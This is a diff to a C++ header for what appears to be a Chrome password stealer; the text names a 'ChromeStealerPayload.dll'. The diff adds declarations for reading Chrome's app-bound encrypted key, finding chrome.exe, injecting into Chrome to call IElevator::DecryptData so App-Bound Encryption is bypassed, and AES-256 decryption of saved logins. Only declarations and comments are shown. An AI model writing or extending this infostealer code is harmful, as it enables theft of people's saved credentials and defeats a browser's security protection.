@@ -14,11 +14,13 @@
 #include <vector>
 #include <fstream>
 #include <wincrypt.h>
+#include <bcrypt.h>
 
 // Link against the required libraries
 #pragma comment(lib, "Crypt32.lib")
 #pragma comment(lib, "Shell32.lib")
 #pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Bcrypt.lib")
 
 
 //using namespace std;
@@ -52,10 +54,27 @@ std::wstring FindLocalState();
 // @return The path to the Login Data file as a wide string.
 std::wstring FindLoginData();
 
-// Retrieves the encrypted key from the Local State file.
+// Retrieves the encrypted key from the Local State file (DPAPI / encrypted_key).
 // @param localStatePath The path to the Local State file.
 // @return The encrypted key as a string.
 std::string getEncryptedKey(const std::wstring& localStatePath);
+
+// Retrieves the app-bound encrypted key from Local State (APPB / app_bound_encrypted_key).
+// Used when Chrome uses App-Bound Encryption (v20).
+// @param localStatePath The path to the Local State file.
+// @return The app_bound_encrypted_key string if present, empty otherwise.
+std::string getAppBoundEncryptedKey(const std::wstring& localStatePath);
+
+// Gets the full path to chrome.exe from registry.
+// @return Path to chrome.exe or empty string.
+std::wstring GetChromePath();
+
+// Decrypts the app-bound key by injecting into Chrome and calling IElevator::DecryptData.
+// Requires ChromeStealerPayload.dll next to the exe.
+// @param localStatePath Path to Local State (used only for fallback message).
+// @param outKey Output 32-byte key. cbData set to 32 on success.
+// @return true if key was obtained.
+bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB& outKey);
 
 // Parses the Login Data file to extract login credentials.
 // @param loginDataPath The path to the Login Data file.
@@ -72,9 +91,12 @@ DATA_BLOB decryptKey(const std::string& encrypted_key);
 // @param ciphertext The encrypted password.
 // @param ciphertext_len The length of the encrypted password.
 // @param key The key used for decryption.
-// @param iv The initialization vector used for decryption.
+// @param key_len The length of the key (should be 32 bytes for AES-256).
+// @param iv The initialization vector used for decryption (12 bytes).
 // @param decrypted The buffer to store the decrypted password.
-void decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted);
+// @param decrypted_len Output parameter for the length of decrypted data.
+// @return True if decryption succeeded, false otherwise.
+bool decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, size_t key_len, unsigned char* iv, unsigned char* decrypted, size_t* decrypted_len);
 
 
 #endif // _WIN32
